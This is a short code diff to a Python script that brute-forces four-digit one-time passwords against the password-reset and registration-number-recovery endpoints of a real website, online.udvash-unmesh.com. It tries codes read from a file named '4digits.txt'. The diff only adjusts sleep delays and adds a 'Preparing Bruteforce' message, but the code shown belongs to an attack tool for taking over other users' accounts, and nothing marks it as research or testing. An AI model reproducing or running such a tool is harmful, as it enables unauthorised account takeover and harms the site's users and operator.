@@ -33,7 +33,7 @@ class ChangePassword:
         data["RegistrationNumber"] = self.registrationNumber
         data["mobileNumber"] = self.PhoneNumber
         print("trying all 10000 combination!")
-        sleep(5)
+        sleep(3)
         otp_url = "https://online.udvash-unmesh.com/Account/ForgotPassword"
         with open("4digits.txt") as file:
             for otp in file:
@@ -71,6 +71,8 @@ class getRegNumber:
         print("OTP sent!")
     
     def crack_otp(self):
+        print("Preparing Bruteforce")
+        sleep(3)
         data["nickName"] = self.nickName
         data["mobileNumber"] = self.phoneNumber
         otp_url = "https://online.udvash-unmesh.com/Account/ForgotRegistrationNumber"
